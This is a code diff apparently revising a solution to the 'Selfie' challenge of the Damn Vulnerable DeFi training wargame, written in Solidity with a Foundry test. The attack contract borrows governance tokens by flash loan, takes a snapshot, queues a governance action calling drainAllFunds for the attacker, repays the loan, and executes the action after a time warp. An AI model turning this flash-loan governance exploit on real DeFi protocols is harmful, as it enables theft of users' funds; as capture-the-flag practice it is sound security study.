@@ -14,44 +14,52 @@ contract AttackContract {
     address public owner;
 
     SelfiePool selfiePool;
-    DamnValuableTokenSnapshot dvtSnapshot;
     SimpleGovernance simpleGovernance;
 
-    uint256 public actionId;
+    uint256 public executeActionId;
 
-    constructor(
-        SelfiePool _selfiePool,
-        DamnValuableTokenSnapshot _dvtSnapshot,
-        SimpleGovernance _simpleGovernance
-    ) {
+    constructor(SelfiePool _selfiePool, SimpleGovernance _simpleGovernance) {
         owner = msg.sender;
         selfiePool = _selfiePool;
-        dvtSnapshot = _dvtSnapshot;
+
         simpleGovernance = _simpleGovernance;
     }
 
-    function attack() public {
+    function attack(uint256 flashLoanAmount) public {
         require(msg.sender == owner, "Not owner");
-        uint256 halfTheSupply = dvtSnapshot.balanceOf(address(selfiePool)) - 1;
-        selfiePool.flashLoan(halfTheSupply);
+
+        selfiePool.flashLoan(flashLoanAmount);
     }
 
-    function receiveTokens(address _dvtSnapshot, uint256 borrowAmount) public {
+    function receiveTokens(address dvtSnapshot, uint256 borrowAmount) public {
         require(msg.sender == address(selfiePool), "Not Pool");
         bytes memory data = abi.encodeWithSignature(
             "drainAllFunds(address)",
-            owner
+            address(owner)
         );
-        uint256 amount = dvtSnapshot.balanceOf(address(selfiePool));
-        uint256 _actionId = simpleGovernance.queueAction(owner, data, amount);
-        actionId = _actionId;
 
-        bool success = dvtSnapshot.transfer(address(selfiePool), borrowAmount);
+        DamnValuableTokenSnapshot(dvtSnapshot).snapshot();
+
+        uint256 amount = DamnValuableTokenSnapshot(dvtSnapshot).balanceOf(
+            address(selfiePool)
+        );
+        uint256 _actionId = simpleGovernance.queueAction(
+            address(selfiePool),
+            data,
+            amount
+        );
+
+        executeActionId = _actionId;
+
+        bool success = DamnValuableTokenSnapshot(dvtSnapshot).transfer(
+            address(selfiePool),
+            borrowAmount
+        );
         require(success, "FlashLoan not paid back");
     }
 
     function executeAttack() public {
-        simpleGovernance.executeAction(actionId);
+        simpleGovernance.executeAction(executeActionId);
     }
 }
 
@@ -97,10 +105,9 @@ contract Selfie is DSTest {
         vm.startPrank(attacker);
         AttackContract attackContract = new AttackContract(
             selfiePool,
-            dvtSnapshot,
             simpleGovernance
         );
-        attackContract.attack();
+        attackContract.attack(TOKENS_IN_POOL);
         vm.warp(block.timestamp + 2 days);
         attackContract.executeAttack();
 
